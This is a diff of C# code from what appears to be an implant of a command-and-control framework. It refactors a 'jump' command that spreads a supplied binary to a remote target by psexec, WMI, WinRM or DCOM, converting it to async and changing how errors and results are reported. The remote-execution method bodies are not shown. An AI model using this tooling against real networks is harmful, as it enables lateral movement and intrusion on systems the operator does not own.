@@ -14,6 +14,7 @@ using System.Threading.Tasks;
 using System.IO;
 using System.Management.Automation;
 using static System.Collections.Specialized.BitVector32;
+using Engineer.Functions;
 
 namespace Engineer.Commands
 {
@@ -21,7 +22,7 @@ namespace Engineer.Commands
     {
         public override string Name => "jump";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             if (task.Arguments.TryGetValue("/target", out string target))
             {
@@ -30,7 +31,8 @@ namespace Engineer.Commands
             }
             else
             {
-                return "error: " + "No target specified use /target <target>";
+                Tasking.FillTaskResults("error: " + "No target specified use /target <target>",task,EngTaskStatus.FailedWithWarnings);
+                return;
             }
             if (task.Arguments.TryGetValue("/method", out string method))
             {
@@ -42,16 +44,19 @@ namespace Engineer.Commands
                 }
                 else
                 {
-                    return "error: " + "Invalid method specified, valid methods are psexec, wmi, winrm, wmi-ps, dcom";
+                    Tasking.FillTaskResults("error: " + "Invalid method specified, valid methods are psexec, wmi, winrm, wmi-ps, dcom",task,EngTaskStatus.FailedWithWarnings);
+                    return;
                 }
             }
             else
             {
-                return "error: " + "No method specified use /method <method>, valid methods are psexec, wmi, winrm, wmi-ps, dcom";
+                Tasking.FillTaskResults("error: " + "No method specified use /method <method>, valid methods are psexec, wmi, winrm, wmi-ps, dcom",task,EngTaskStatus.FailedWithWarnings);
+                return;
             }
             if (task.File.Length < 1)
             {
-                return "error: no file provided";
+                Tasking.FillTaskResults("error: no file provided",task,EngTaskStatus.FailedWithWarnings);
+                return;
             }
             var binary = task.File;
 
@@ -76,7 +81,7 @@ namespace Engineer.Commands
             {
                 jumpDcom(target, binary);
             }
-            return "Jumped";
+            Tasking.FillTaskResults("Jumped",task,EngTaskStatus.Complete);
         }
 
         public static void jumpPsexec(string target, byte[] binary)
